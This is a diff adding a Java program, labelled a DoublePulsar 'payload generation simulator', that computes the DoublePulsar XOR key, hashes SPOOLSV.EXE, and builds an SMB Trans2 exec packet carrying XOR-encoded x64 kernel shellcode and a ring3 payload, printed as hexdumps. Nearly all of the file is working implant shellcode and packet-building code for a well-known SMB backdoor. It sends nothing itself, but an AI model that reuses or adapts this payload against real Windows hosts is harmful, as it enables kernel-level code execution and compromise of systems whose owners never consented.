@@ -1,0 +1,336 @@
+import java.nio.*; //import java.nio.ByteBuffer;
+import java.util.*;
+import java.nio.ByteBuffer;
+import java.nio.ByteOrder;
+
+import java.io.UnsupportedEncodingException;
+/*
+Doublepulsar payload generation simulator
+*/
+
+public class Main {
+    
+    public static byte[] trans2_exec = new byte[] {
+
+        (byte)0x00,(byte)0x00,(byte)0x10,(byte)0x4e,(byte)0xff,(byte)0x53,(byte)0x4d,(byte)0x42,(byte)0x32,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x18,(byte)0x07,(byte)0xc0,
+        (byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x08,(byte)0xff,(byte)0xfe,
+        (byte)0x00,(byte)0x08,(byte)0x42,(byte)0x00,(byte)0x0f,(byte)0x0c,(byte)0x00,(byte)0x00,(byte)0x10,(byte)0x01,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x00,
+        (byte)0x00,(byte)0x25,(byte)0x89,(byte)0x1a,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x0c,(byte)0x00,(byte)0x42,(byte)0x00,(byte)0x00,(byte)0x10,(byte)0x4e,(byte)0x00,(byte)0x01,
+        (byte)0x00,(byte)0x0e,(byte)0x00,(byte)0x0d,(byte)0x10,(byte)0x00 
+    };
+    
+    public static String xxd(byte[] data) {
+    StringBuilder sb = new StringBuilder();
+    int len = data.length;
+    
+    for (int i = 0; i < len; i += 16) {
+        // Print offset
+        sb.append(String.format("%04X: ", i));
+        
+        // Print hex values
+        for (int j = 0; j < 16; j++) {
+            if (i + j < len) {
+                sb.append(String.format("%02X ", data[i + j]));
+            } else {
+                sb.append("   "); // padding if line is short
+            }
+            if (j == 7) sb.append(" "); // extra space in the middle
+        }
+        
+        sb.append(" |");
+        
+        // Print ASCII characters
+        for (int j = 0; j < 16 && (i + j) < len; j++) {
+            byte b = data[i + j];
+            if (b >= 32 && b <= 126) {
+                sb.append((char) b);
+            } else {
+                sb.append(".");
+            }
+        }
+        
+        sb.append("|\n");
+    }
+    
+    return sb.toString();
+}
+        
+    public static byte[] byteXor(byte[] data, byte[] keyBytes) {
+    byte[] result = new byte[data.length];
+    int keyLength = keyBytes.length;
+
+    for (int i = 0; i < data.length; i++) {
+        result[i] = (byte) (data[i] ^ keyBytes[i % keyLength]);
+    }
+
+    return result;
+    }
+	
+	    // Rotate Right (ROR) function
+    static int ror(int dword, int bits) {
+        return (dword >>> bits) | (dword << (32 - bits));
+    }
+
+    // Generate process hash
+    static int generateProcessHash(String process) {
+        int procHash = 0;
+
+        for (int i = 0; i <= process.length(); i++) {
+            procHash = ror(procHash, 13);
+            procHash += (i < process.length()) ? (byte) process.charAt(i) : (byte) 0;
+        }
+
+        return procHash;
+    }
+	
+    
+   public static int ComputeDOUBLEPULSARXorKey(int sig) {
+    return 2 * sig ^ ((((sig >>> 16) | (sig & 0xFF0000)) >>> 8) |
+                      (((sig << 16) | (sig & 0xFF00)) << 8));
+    }
+	
+	    // Convert 4-byte little-endian array to int
+    public static int LE2INT(byte[] data) {
+        return ((data[3] & 0xFF) << 24) |
+               ((data[2] & 0xFF) << 16) |
+               ((data[1] & 0xFF) << 8)  |
+               (data[0] & 0xFF);
+    }
+    
+    public static String hexdump(byte[] data) {
+    StringBuilder sb = new StringBuilder();
+    for (int i = 0; i < data.length; i++) {
+        if (i % 16 == 0) sb.append(String.format("%04X: ", i)); // address
+        sb.append(String.format("%02X ", data[i]));
+        if (i % 16 == 15) sb.append("\n"); // newline every 16 bytes
+    }
+    return sb.toString();
+}
+    
+    public static void main(String[] args) {
+        // Equivalent to unsigned char signature[] = { 0x79, 0xe7, 0xdf, 0x90 };
+        byte[] signature = {(byte) 0x79, (byte) 0xE7, (byte) 0xDF, (byte) 0x90};
+
+        // Convert little-endian byte array to int
+        int sig = LE2INT(signature);
+
+        // Calculate XOR key
+        int xorKey = ComputeDOUBLEPULSARXorKey(sig);
+
+        System.out.printf("Calculated XOR KEY:  0x%08X%n", xorKey);
+
+        // Split xorKey into 4 bytes (little-endian)
+        byte[] byteXorKey = new byte[4];
+        byteXorKey[0] = (byte) (xorKey & 0xFF);
+        byteXorKey[1] = (byte) ((xorKey >> 8) & 0xFF);
+        byteXorKey[2] = (byte) ((xorKey >> 16) & 0xFF);
+        byteXorKey[3] = (byte) ((xorKey >> 24) & 0xFF);
+		
+		// Create a buffer of 4096 bytes
+        byte[] buffer = new byte[4096];
+
+        // Fill the buffer with 0x90
+        for (int i = 0; i < buffer.length; i++) {
+            buffer[i] = (byte) 0x00;
+        }
+
+        // Optional: print the first few bytes to verify
+        for (int i = 0; i < 10; i++) {
+            System.out.printf("buffer[%d] = 0x%02X%n", i, buffer[i]);
+        }
+		
+		byte[] XorBytes = byteXor(buffer, byteXorKey);
+		
+		// Optional: print the first few bytes to verify
+        for (int i = 0; i < 12; i++) {
+            System.out.printf("Xored bytes buffer[%d] = 0x%02X%n", i, XorBytes[i]);
+        }
+        
+        String procName = "SPOOLSV.EXE";
+        int hash = generateProcessHash(procName);
+        System.out.printf("Process Hash for %s: 0x%08X%n", procName, hash);
+	
+        byte[] Parameters = new byte[12];
+
+        int TotalSizeOfPayload = 4096; // 0x50D800
+        int ChunkSize = 4096;
+        int OffsetInPayload = 0;
+        
+        int byteCount = 4096 + 12; // Java 'int' is 32-bit, but that's fine
+
+        // Store byteCount into byteArray at offset 0x43 (67)
+        trans2_exec[0x43] = (byte) (byteCount & 0xFF);       // lower byte
+        trans2_exec[0x44] = (byte) ((byteCount >> 8) & 0xFF); // upper byte
+
+        // Manually place TotalSizeOfPayload in little-endian
+        Parameters[0] = (byte) (TotalSizeOfPayload);
+        Parameters[1] = (byte) ((TotalSizeOfPayload >> 8) & 0xFF);
+        Parameters[2] = (byte) ((TotalSizeOfPayload >> 16) & 0xFF);
+        Parameters[3] = (byte) ((TotalSizeOfPayload >> 24) & 0xFF);
+
+        // Manually place ChunkSize in little-endian
+        Parameters[4] = (byte) (ChunkSize);
+        Parameters[5] = (byte) ((ChunkSize >> 8) & 0xFF);
+        Parameters[6] = (byte) ((ChunkSize >> 16) & 0xFF);
+        Parameters[7] = (byte) ((ChunkSize >> 24) & 0xFF);
+
+        // Manually place OffsetInPayload in little-endian
+        Parameters[8] = (byte) (OffsetInPayload);
+        Parameters[9] = (byte) ((OffsetInPayload >> 8) & 0xFF);
+        Parameters[10] = (byte) ((OffsetInPayload >> 16) & 0xFF);
+        Parameters[11] = (byte) ((OffsetInPayload >> 24) & 0xFF);
+        
+        System.out.printf("SMB Parameters:  ");
+        // Print the byte array in hex to verify
+        for (byte b : Parameters) {
+            System.out.printf("%02X ", b);
+        }
+        System.out.printf("\n");
+        
+        byte[] XorParameterBytes = byteXor(Parameters, byteXorKey);
+        
+        System.out.printf("XOR SMB Parameters:  ");
+        // Print the XORed parameters byte array in hex to verify
+        for (byte b : XorParameterBytes) {
+            System.out.printf("%02X ", b);
+        }
+        System.out.printf("\n");
+	    
+        byte[] hMem = new byte[4096];
+        byte[] shellcode = new byte[] {
+                    (byte)0x31, (byte)0xc9, (byte)0x41, (byte)0xe2, (byte)0x01, (byte)0xc3, (byte)0x56, (byte)0x41, (byte)0x57, (byte)0x41, (byte)0x56, (byte)0x41, (byte)0x55, (byte)0x41, (byte)0x54, (byte)0x53,
+                    (byte)0x55, (byte)0x48, (byte)0x89, (byte)0xe5, (byte)0x66, (byte)0x83, (byte)0xe4, (byte)0xf0, (byte)0x48, (byte)0x83, (byte)0xec, (byte)0x20, (byte)0x4c, (byte)0x8d, (byte)0x35, (byte)0xe3,
+                    (byte)0xff, (byte)0xff, (byte)0xff, (byte)0x65, (byte)0x4c, (byte)0x8b, (byte)0x3c, (byte)0x25, (byte)0x38, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x4d, (byte)0x8b, (byte)0x7f, (byte)0x04,
+                    (byte)0x49, (byte)0xc1, (byte)0xef, (byte)0x0c, (byte)0x49, (byte)0xc1, (byte)0xe7, (byte)0x0c, (byte)0x49, (byte)0x81, (byte)0xef, (byte)0x00, (byte)0x10, (byte)0x00, (byte)0x00, (byte)0x49,
+                    (byte)0x8b, (byte)0x37, (byte)0x66, (byte)0x81, (byte)0xfe, (byte)0x4d, (byte)0x5a, (byte)0x75, (byte)0xef, (byte)0x41, (byte)0xbb, (byte)0x5c, (byte)0x72, (byte)0x11, (byte)0x62, (byte)0xe8,
+                    (byte)0x18, (byte)0x02, (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x89, (byte)0xc6, (byte)0x48, (byte)0x81, (byte)0xc6, (byte)0x08, (byte)0x03, (byte)0x00, (byte)0x00, (byte)0x41, (byte)0xbb,
+                    (byte)0x7a, (byte)0xba, (byte)0xa3, (byte)0x30, (byte)0xe8, (byte)0x03, (byte)0x02, (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x89, (byte)0xf1, (byte)0x48, (byte)0x39, (byte)0xf0, (byte)0x77,
+                    (byte)0x11, (byte)0x48, (byte)0x8d, (byte)0x90, (byte)0x00, (byte)0x05, (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x39, (byte)0xf2, (byte)0x72, (byte)0x05, (byte)0x48, (byte)0x29, (byte)0xc6,
+                    (byte)0xeb, (byte)0x08, (byte)0x48, (byte)0x8b, (byte)0x36, (byte)0x48, (byte)0x39, (byte)0xce, (byte)0x75, (byte)0xe2, (byte)0x49, (byte)0x89, (byte)0xf4, (byte)0x31, (byte)0xdb, (byte)0x89,
+                    (byte)0xd9, (byte)0x83, (byte)0xc1, (byte)0x04, (byte)0x81, (byte)0xf9, (byte)0x00, (byte)0x00, (byte)0x01, (byte)0x00, (byte)0x0f, (byte)0x8d, (byte)0x66, (byte)0x01, (byte)0x00, (byte)0x00,
+                    (byte)0x4c, (byte)0x89, (byte)0xf2, (byte)0x89, (byte)0xcb, (byte)0x41, (byte)0xbb, (byte)0x66, (byte)0x55, (byte)0xa2, (byte)0x4b, (byte)0xe8, (byte)0xbc, (byte)0x01, (byte)0x00, (byte)0x00,
+                    (byte)0x85, (byte)0xc0, (byte)0x75, (byte)0xdb, (byte)0x49, (byte)0x8b, (byte)0x0e, (byte)0x41, (byte)0xbb, (byte)0xa3, (byte)0x6f, (byte)0x72, (byte)0x2d, (byte)0xe8, (byte)0xaa, (byte)0x01,
+                    (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x89, (byte)0xc6, (byte)0xe8, (byte)0x50, (byte)0x01, (byte)0x00, (byte)0x00, (byte)0x41, (byte)0x81, (byte)0xf9 
+                };
+
+                byte[] shellcodePartTwo = new byte[] {
+                    (byte)0x75, (byte)0xbc, (byte)0x49, (byte)0x8b, (byte)0x1e, (byte)0x4d, (byte)0x8d, (byte)0x6e, (byte)0x10, (byte)0x4c, (byte)0x89, (byte)0xea, (byte)0x48, (byte)0x89, (byte)0xd9,
+                    (byte)0x41, (byte)0xbb, (byte)0xe5, (byte)0x24, (byte)0x11, (byte)0xdc, (byte)0xe8, (byte)0x81, (byte)0x01, (byte)0x00, (byte)0x00, (byte)0x6a, (byte)0x40, (byte)0x68, (byte)0x00, (byte)0x10,
+                    (byte)0x00, (byte)0x00, (byte)0x4d, (byte)0x8d, (byte)0x4e, (byte)0x08, (byte)0x49, (byte)0xc7, (byte)0x01, (byte)0x00, (byte)0x10, (byte)0x00, (byte)0x00, (byte)0x4d, (byte)0x31, (byte)0xc0,
+                    (byte)0x4c, (byte)0x89, (byte)0xf2, (byte)0x31, (byte)0xc9, (byte)0x48, (byte)0x89, (byte)0x0a, (byte)0x48, (byte)0xf7, (byte)0xd1, (byte)0x41, (byte)0xbb, (byte)0x4b, (byte)0xca, (byte)0x0a,
+                    (byte)0xee, (byte)0x48, (byte)0x83, (byte)0xec, (byte)0x20, (byte)0xe8, (byte)0x52, (byte)0x01, (byte)0x00, (byte)0x00, (byte)0x85, (byte)0xc0, (byte)0x0f, (byte)0x85, (byte)0xc8, (byte)0x00,
+                    (byte)0x00, (byte)0x00, (byte)0x49, (byte)0x8b, (byte)0x3e, (byte)0x48, (byte)0x8d, (byte)0x35, (byte)0xe9, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x31, (byte)0xc9, (byte)0x66, (byte)0x03,
+                    (byte)0x0d, (byte)0xd7, (byte)0x01, (byte)0x00, (byte)0x00, (byte)0x66, (byte)0x81, (byte)0xc1, (byte)0xf9, (byte)0x00, (byte)0xf3, (byte)0xa4, (byte)0x48, (byte)0x89, (byte)0xde, (byte)0x48,
+                    (byte)0x81, (byte)0xc6, (byte)0x08, (byte)0x03, (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x89, (byte)0xf1, (byte)0x48, (byte)0x8b, (byte)0x11, (byte)0x4c, (byte)0x29, (byte)0xe2, (byte)0x51,
+                    (byte)0x52, (byte)0x48, (byte)0x89, (byte)0xd1, (byte)0x48, (byte)0x83, (byte)0xec, (byte)0x20, (byte)0x41, (byte)0xbb, (byte)0x26, (byte)0x40, (byte)0x36, (byte)0x9d, (byte)0xe8, (byte)0x09,
+                    (byte)0x01, (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x83, (byte)0xc4, (byte)0x20, (byte)0x5a, (byte)0x59, (byte)0x48, (byte)0x85, (byte)0xc0, (byte)0x74, (byte)0x18, (byte)0x48, (byte)0x8b,
+                    (byte)0x80, (byte)0xc8, (byte)0x02, (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x85, (byte)0xc0, (byte)0x74, (byte)0x0c, (byte)0x48, (byte)0x83, (byte)0xc2, (byte)0x4c, (byte)0x8b, (byte)0x02,
+                    (byte)0x0f, (byte)0xba, (byte)0xe0, (byte)0x05, (byte)0x72, (byte)0x05, (byte)0x48, (byte)0x8b, (byte)0x09, (byte)0xeb, (byte)0xbe, (byte)0x48, (byte)0x83, (byte)0xea, (byte)0x4c, (byte)0x49,
+                    (byte)0x89, (byte)0xd4, (byte)0x31, (byte)0xd2, (byte)0x80, (byte)0xc2, (byte)0x90, (byte)0x31, (byte)0xc9, (byte)0x41, (byte)0xbb, (byte)0x26, (byte)0xac, (byte)0x50, (byte)0x91, (byte)0xe8,
+                    (byte)0xc8, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x89, (byte)0xc1, (byte)0x4c, (byte)0x8d, (byte)0x89, (byte)0x80, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x41, (byte)0xc6,
+                    (byte)0x01, (byte)0xc3, (byte)0x4c, (byte)0x89, (byte)0xe2, (byte)0x49, (byte)0x89, (byte)0xc4, (byte)0x4d, (byte)0x31, (byte)0xc0, (byte)0x41, (byte)0x50, (byte)0x6a, (byte)0x01, (byte)0x49,
+                    (byte)0x8b, (byte)0x06, (byte)0x50, (byte)0x41, (byte)0x50, (byte)0x48, (byte)0x83, (byte)0xec, (byte)0x20, (byte)0x41, (byte)0xbb, (byte)0xac, (byte)0xce, (byte)0x55, (byte)0x4b, (byte)0xe8,
+                    (byte)0x98, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x31, (byte)0xd2, (byte)0x52, (byte)0x52, (byte)0x41, (byte)0x58, (byte)0x41, (byte)0x59, (byte)0x4c, (byte)0x89, (byte)0xe1, (byte)0x41,
+                    (byte)0xbb, (byte)0x18, (byte)0x38, (byte)0x09, (byte)0x9e, (byte)0xe8, (byte)0x82, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x4c, (byte)0x89, (byte)0xe9, (byte)0x41, (byte)0xbb, (byte)0x22,
+                    (byte)0xb7, (byte)0xb3, (byte)0x7d, (byte)0xe8, (byte)0x74, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x89, (byte)0xd9, (byte)0x41, (byte)0xbb, (byte)0x0d, (byte)0xe2, (byte)0x4d,
+                    (byte)0x85, (byte)0xe8, (byte)0x66, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x89, (byte)0xec, (byte)0x5d, (byte)0x5b, (byte)0x41, (byte)0x5c, (byte)0x41, (byte)0x5d, (byte)0x41,
+                    (byte)0x5e, (byte)0x41, (byte)0x5f, (byte)0x5e, (byte)0xc3, (byte)0xe9, (byte)0xb5, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x4d, (byte)0x31, (byte)0xc9, (byte)0x31, (byte)0xc0, (byte)0xac,
+                    (byte)0x41, (byte)0xc1, (byte)0xc9, (byte)0x0d, (byte)0x3c, (byte)0x61, (byte)0x7c, (byte)0x02, (byte)0x2c, (byte)0x20, (byte)0x41, (byte)0x01, (byte)0xc1, (byte)0x38, (byte)0xe0, (byte)0x75,
+                    (byte)0xec, (byte)0xc3, (byte)0x31, (byte)0xd2, (byte)0x65, (byte)0x48, (byte)0x8b, (byte)0x52, (byte)0x60, (byte)0x48, (byte)0x8b, (byte)0x52, (byte)0x18, (byte)0x48, (byte)0x8b, (byte)0x52,
+                    (byte)0x20, (byte)0x48, (byte)0x8b, (byte)0x12, (byte)0x48, (byte)0x8b, (byte)0x72, (byte)0x50, (byte)0x48, (byte)0x0f, (byte)0xb7, (byte)0x4a, (byte)0x4a, (byte)0x45, (byte)0x31, (byte)0xc9,
+                    (byte)0x31, (byte)0xc0, (byte)0xac, (byte)0x3c, (byte)0x61, (byte)0x7c, (byte)0x02, (byte)0x2c, (byte)0x20, (byte)0x41, (byte)0xc1, (byte)0xc9, (byte)0x0d, (byte)0x41, (byte)0x01, (byte)0xc1,
+                    (byte)0xe2, (byte)0xee, (byte)0x45, (byte)0x39, (byte)0xd9, (byte)0x75, (byte)0xda, (byte)0x4c, (byte)0x8b, (byte)0x7a, (byte)0x20, (byte)0xc3, (byte)0x4c, (byte)0x89, (byte)0xf8, (byte)0x41,
+                    (byte)0x51, (byte)0x41, (byte)0x50, (byte)0x52, (byte)0x51, (byte)0x56, (byte)0x48, (byte)0x89, (byte)0xc2, (byte)0x8b, (byte)0x42, (byte)0x3c, (byte)0x48, (byte)0x01, (byte)0xd0, (byte)0x8b,
+                    (byte)0x80, (byte)0x88, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x01, (byte)0xd0, (byte)0x50, (byte)0x8b, (byte)0x48, (byte)0x18, (byte)0x44, (byte)0x8b, (byte)0x40, (byte)0x20,
+                    (byte)0x49, (byte)0x01, (byte)0xd0, (byte)0x48, (byte)0xff, (byte)0xc9, (byte)0x41, (byte)0x8b, (byte)0x34, (byte)0x88, (byte)0x48, (byte)0x01, (byte)0xd6, (byte)0xe8, (byte)0x78, (byte)0xff,
+                    (byte)0xff, (byte)0xff, (byte)0x45, (byte)0x39, (byte)0xd9, (byte)0x75, (byte)0xec, (byte)0x58, (byte)0x44, (byte)0x8b, (byte)0x40, (byte)0x24, (byte)0x49, (byte)0x01, (byte)0xd0, (byte)0x66,
+                    (byte)0x41, (byte)0x8b, (byte)0x0c, (byte)0x48, (byte)0x44, (byte)0x8b, (byte)0x40, (byte)0x1c, (byte)0x49, (byte)0x01, (byte)0xd0, (byte)0x41, (byte)0x8b, (byte)0x04, (byte)0x88, (byte)0x48,
+                    (byte)0x01, (byte)0xd0, (byte)0x5e, (byte)0x59, (byte)0x5a, (byte)0x41, (byte)0x58, (byte)0x41, (byte)0x59, (byte)0x41, (byte)0x5b, (byte)0x41, (byte)0x53, (byte)0xff, (byte)0xe0, (byte)0x56,
+                    (byte)0x41, (byte)0x57, (byte)0x55, (byte)0x48, (byte)0x89, (byte)0xe5, (byte)0x48, (byte)0x83, (byte)0xec, (byte)0x20, (byte)0x41, (byte)0xbb, (byte)0xda, (byte)0x16, (byte)0xaf, (byte)0x92,
+                    (byte)0xe8, (byte)0x4d, (byte)0xff, (byte)0xff, (byte)0xff, (byte)0x31, (byte)0xc9, (byte)0x51, (byte)0x51, (byte)0x51, (byte)0x51, (byte)0x41, (byte)0x59, (byte)0x4c, (byte)0x8d, (byte)0x05,
+                    (byte)0x1a, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x5a, (byte)0x48, (byte)0x83, (byte)0xec, (byte)0x20, (byte)0x41, (byte)0xbb, (byte)0x46, (byte)0x45, (byte)0x1b, (byte)0x22, (byte)0xe8,
+                    (byte)0x68, (byte)0xff, (byte)0xff, (byte)0xff, (byte)0x48, (byte)0x89, (byte)0xec, (byte)0x5d, (byte)0x41, (byte)0x5f, (byte)0x5e, (byte)0xc3 
+                };
+
+                byte[] ring3 = new byte[] {
+                    (byte)0x48, (byte)0x31, (byte)0xc9, (byte)0x48, (byte)0x81, (byte)0xe9, (byte)0xdd, (byte)0xff, (byte)0xff, (byte)0xff, (byte)0x48, (byte)0x8d, (byte)0x05, (byte)0xef,
+                    (byte)0xff, (byte)0xff, (byte)0xff, (byte)0x48, (byte)0xbb, (byte)0x1d, (byte)0xab, (byte)0xfd, (byte)0x0e, (byte)0xd7, (byte)0x3a, (byte)0xd2, (byte)0x27, (byte)0x48,
+                    (byte)0x31, (byte)0x58, (byte)0x27, (byte)0x48, (byte)0x2d, (byte)0xf8, (byte)0xff, (byte)0xff, (byte)0xff, (byte)0xe2, (byte)0xf4, (byte)0xe1, (byte)0xe3, (byte)0x7e,
+                    (byte)0xea, (byte)0x27, (byte)0xd2, (byte)0x12, (byte)0x27, (byte)0x1d, (byte)0xab, (byte)0xbc, (byte)0x5f, (byte)0x96, (byte)0x6a, (byte)0x80, (byte)0x76, (byte)0x4b,
+                    (byte)0xe3, (byte)0xcc, (byte)0xdc, (byte)0xb2, (byte)0x72, (byte)0x59, (byte)0x75, (byte)0x7d, (byte)0xe3, (byte)0x76, (byte)0x5c, (byte)0xcf, (byte)0x72, (byte)0x59,
+                    (byte)0x75, (byte)0x3d, (byte)0xe3, (byte)0x76, (byte)0x7c, (byte)0x87, (byte)0x72, (byte)0xdd, (byte)0x90, (byte)0x57, (byte)0xe1, (byte)0xb0, (byte)0x3f, (byte)0x1e,
+                    (byte)0x72, (byte)0xe3, (byte)0xe7, (byte)0xb1, (byte)0x97, (byte)0x9c, (byte)0x72, (byte)0xd5, (byte)0x16, (byte)0xf2, (byte)0x66, (byte)0xdc, (byte)0x62, (byte)0xf0,
+                    (byte)0x4f, (byte)0xd6, (byte)0xfb, (byte)0x30, (byte)0xca, (byte)0x4f, (byte)0xea, (byte)0xac, (byte)0x46, (byte)0x5c, (byte)0x68, (byte)0xf2, (byte)0xac, (byte)0x5f,
+                    (byte)0x97, (byte)0xb5, (byte)0x0f, (byte)0x07, (byte)0xb1, (byte)0x52, (byte)0xaf, (byte)0x1d, (byte)0xab, (byte)0xfd, (byte)0x46, (byte)0x52, (byte)0xfa, (byte)0xa6,
+                    (byte)0x40, (byte)0x55, (byte)0xaa, (byte)0x2d, (byte)0x5e, (byte)0x5c, (byte)0x72, (byte)0xca, (byte)0x63, (byte)0x96, (byte)0xeb, (byte)0xdd, (byte)0x47, (byte)0xd6,
+                    (byte)0xea, (byte)0x31, (byte)0x71, (byte)0x55, (byte)0x54, (byte)0x34, (byte)0x4f, (byte)0x5c, (byte)0x0e, (byte)0x5a, (byte)0x6f, (byte)0x1c, (byte)0x7d, (byte)0xb0,
+                    (byte)0x3f, (byte)0x1e, (byte)0x72, (byte)0xe3, (byte)0xe7, (byte)0xb1, (byte)0xea, (byte)0x3c, (byte)0xc7, (byte)0xda, (byte)0x7b, (byte)0xd3, (byte)0xe6, (byte)0x25,
+                    (byte)0x4b, (byte)0x88, (byte)0xff, (byte)0x9b, (byte)0x39, (byte)0x9e, (byte)0x03, (byte)0x15, (byte)0xee, (byte)0xc4, (byte)0xdf, (byte)0xa2, (byte)0xe2, (byte)0x8a,
+                    (byte)0x63, (byte)0x96, (byte)0xeb, (byte)0xd9, (byte)0x47, (byte)0xd6, (byte)0xea, (byte)0xb4, (byte)0x66, (byte)0x96, (byte)0xa7, (byte)0xb5, (byte)0x4a, (byte)0x5c,
+                    (byte)0x7a, (byte)0xce, (byte)0x6e, (byte)0x1c, (byte)0x7b, (byte)0xbc, (byte)0x85, (byte)0xd3, (byte)0xb2, (byte)0x9a, (byte)0x26, (byte)0xcd, (byte)0xea, (byte)0xa5,
+                    (byte)0x4f, (byte)0x8f, (byte)0x64, (byte)0x8b, (byte)0x7d, (byte)0x5c, (byte)0xf3, (byte)0xbc, (byte)0x57, (byte)0x96, (byte)0x60, (byte)0x9a, (byte)0xa4, (byte)0xf1,
+                    (byte)0x8b, (byte)0xbc, (byte)0x5c, (byte)0x28, (byte)0xda, (byte)0x8a, (byte)0x66, (byte)0x44, (byte)0xf1, (byte)0xb5, (byte)0x85, (byte)0xc5, (byte)0xd3, (byte)0x85,
+                    (byte)0xd8, (byte)0xe2, (byte)0x54, (byte)0xa0, (byte)0x46, (byte)0x6d, (byte)0x3b, (byte)0xd2, (byte)0x27, (byte)0x1d, (byte)0xab, (byte)0xfd, (byte)0x0e, (byte)0xd7,
+                    (byte)0x72, (byte)0x5f, (byte)0xaa, (byte)0x1c, (byte)0xaa, (byte)0xfd, (byte)0x0e, (byte)0x96, (byte)0x80, (byte)0xe3, (byte)0xac, (byte)0x72, (byte)0x2c, (byte)0x02,
+                    (byte)0xdb, (byte)0x6c, (byte)0xca, (byte)0x67, (byte)0x85, (byte)0x4b, (byte)0xea, (byte)0x47, (byte)0xa8, (byte)0x42, (byte)0x87, (byte)0x4f, (byte)0xd8, (byte)0xc8,
+                    (byte)0xe3, (byte)0x7e, (byte)0xca, (byte)0xff, (byte)0x06, (byte)0xd4, (byte)0x5b, (byte)0x17, (byte)0x2b, (byte)0x06, (byte)0xee, (byte)0xa2, (byte)0x3f, (byte)0x69,
+                    (byte)0x60, (byte)0x0e, (byte)0xd9, (byte)0x92, (byte)0x64, (byte)0xd7, (byte)0x63, (byte)0x93, (byte)0xae, (byte)0xc7, (byte)0x54, (byte)0x28, (byte)0x6d, (byte)0xb6,
+                    (byte)0x56, (byte)0xb1, (byte)0x09, (byte)0x78, (byte)0xd3, (byte)0x98, (byte)0x0e, (byte)0xd7, (byte)0x3a, (byte)0xd2, (byte)0x27
+                };
+        
+        int shellcodeOnePartLen = shellcode.length;
+        int shellcodePartTwoLen = shellcodePartTwo.length;
+        int ring3Len = ring3.length;
+        int kernelShellcodeSize = shellcodeOnePartLen + shellcodePartTwoLen + 4;
+        System.out.println("Total size of kernel shellcode: " + kernelShellcodeSize);
+        
+        // Fill the buffer with 0x90
+        for (int i = 0; i < hMem.length; i++) {
+            hMem[i] = (byte) 0x00;
+        }
+        System.arraycopy(shellcode, 0, hMem, 0, shellcodeOnePartLen);
+        ByteBuffer.wrap(hMem, shellcodeOnePartLen, 4).order(ByteOrder.LITTLE_ENDIAN).putInt(hash);
+        
+        // Copy the second part of the shellcode into hMem
+        System.arraycopy(shellcodePartTwo, 0, hMem, shellcodeOnePartLen + 4, shellcodePartTwoLen);
+
+        // Add the length of ring3 (converted to short) into hMem
+        ByteBuffer.wrap(hMem, kernelShellcodeSize, 2).order(ByteOrder.LITTLE_ENDIAN).putShort((short) ring3Len);
+
+        // Copy the ring3 data into hMem
+        System.arraycopy(ring3, 0, hMem, kernelShellcodeSize + 2, ring3Len);
+        
+        System.out.println("Shellcode prepared successfully.");
+        
+        byte[] XorPayload = byteXor(hMem, byteXorKey);
+        
+        // Create a new byte array to hold all three byte arrays
+        byte[] doublepulsar_packet = new byte[4178];
+        System.arraycopy(trans2_exec, 0, doublepulsar_packet, 0, trans2_exec.length);
+        System.arraycopy(XorParameterBytes, 0, doublepulsar_packet, trans2_exec.length, XorParameterBytes.length);
+        System.arraycopy(XorPayload, 0, doublepulsar_packet, trans2_exec.length + XorParameterBytes.length, XorPayload.length);
+        
+        // Print out the merged array to verify (Optional)
+        System.out.println("Merged byte array length: " + doublepulsar_packet.length);
+    
+        System.out.println("Hexdump of transaction 2 packet:  ");
+        System.out.println(xxd(trans2_exec));
+        
+         System.out.println("Hexdump of byte buffer:  ");
+        System.out.println(xxd(doublepulsar_packet));
+
+
+
+
+
+      
+        /* Update NetBios len for last packet
+        int last_smb_count = 800 + 70 + 12;
+        byte[] netbios_len = new byte[2];
+        netbios_len[0] = (byte) ((last_smb_count >> 8) & 0xFF); // High byte
+        netbios_len[1] = (byte) (last_smb_count & 0xFF);        // Low byte
+        */
+
+
+    }
+}
